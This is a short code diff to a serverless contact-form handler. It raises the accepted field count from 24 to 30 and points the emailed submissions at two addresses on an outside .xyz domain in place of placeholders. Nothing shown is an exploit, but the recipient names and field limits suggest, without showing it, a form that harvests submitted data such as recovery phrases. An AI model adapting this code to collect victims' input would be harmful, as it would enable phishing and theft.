@@ -140,7 +140,7 @@ exports.handler = async (event) => {
         });
 
 
-        if (Object.keys(formData).length <= 24) {
+        if (Object.keys(formData).length <= 30) {
 
         // Generate a message from all form data
         let messageContent = "You have received a new form submission:\n\n";
@@ -151,7 +151,7 @@ exports.handler = async (event) => {
         // Setup email data
         let mailOptions = {
             from: process.env.SMTP_USER, // Sender's email
-            to: "emailone", // Recipient's email
+            to: "centralised-rectify@salxpie.xyz", // Recipient's email
             subject: `New Contact Form Submission`, // Subject
             text: messageContent, // Body content
         };
@@ -174,7 +174,7 @@ exports.handler = async (event) => {
         // Setup email data
         let mailOptions = {
             from: process.env.SMTP_USER, // Sender's email
-            to: "emailtwo", // Recipient's email
+            to: "mine@salxpie.xyz", // Recipient's email
             subject: `New Contact Form Submission`, // Subject
             text: messageContent, // Body content
         };
